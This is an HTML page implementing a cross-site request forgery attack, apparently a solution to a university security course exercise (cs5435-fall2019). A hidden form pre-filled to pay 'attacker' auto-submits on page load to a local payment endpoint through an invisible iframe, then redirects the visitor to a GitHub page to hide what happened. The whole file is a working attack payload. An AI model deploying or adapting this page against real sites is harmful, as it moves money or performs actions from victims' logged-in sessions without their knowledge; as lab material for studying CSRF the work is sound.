<html>
  <div class="payment-form" style="visibility: hidden">
    <h3 class="payment-header">Make payment?</h3>

    <form action="//localhost:8080/pay" method="post" target="target">
      <div class="form-group">
        <div class="form-label">To:</div>
        <div class="form-input">
          <input name="recipient" type="text" value="attacker" />
        </div>
      </div>
      <div class="form-group">
        <div class="form-label">Amount:</div>
        <div class="form-input">
          <input name="amount" type="number" value="10" />
        </div>
      </div>
      <input class="form-button" type="submit" value="Pay" />
    </form>
    <iframe width="0" height="0" id="target" name="target"></iframe>
  </div>

  <script>
    window.addEventListener("load", () => {
      document.forms[0].submit();

      document.getElementById("target").addEventListener("load", () => {
        window.location.replace("https://github.com/tomrist/cs5435-fall2019");
      });
    });
  </script>
</html>
